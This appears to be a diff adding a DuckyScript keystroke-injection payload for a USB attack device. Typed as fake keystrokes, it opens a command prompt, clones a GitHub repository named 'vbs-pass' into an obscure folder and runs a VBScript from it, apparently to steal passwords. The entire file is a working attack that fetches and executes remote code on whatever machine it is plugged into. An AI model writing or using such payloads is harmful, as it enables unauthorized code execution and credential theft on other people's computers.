@@ -1,0 +1,16 @@
+DELAY 500
+GUI d
+DELAY 50
+GUI r
+DELAY 2000
+STRING cmd
+ENTER
+DELAY 2000
+STRING git clone https://github.com/k1lyabenzo/vbs-pass.git C:/12jehf327/
+DELAY 2000
+ENTER
+DELAY 5000
+STRING cd C:/12jehf327/
+ENTER
+STRING scr.vbs
+ENTER
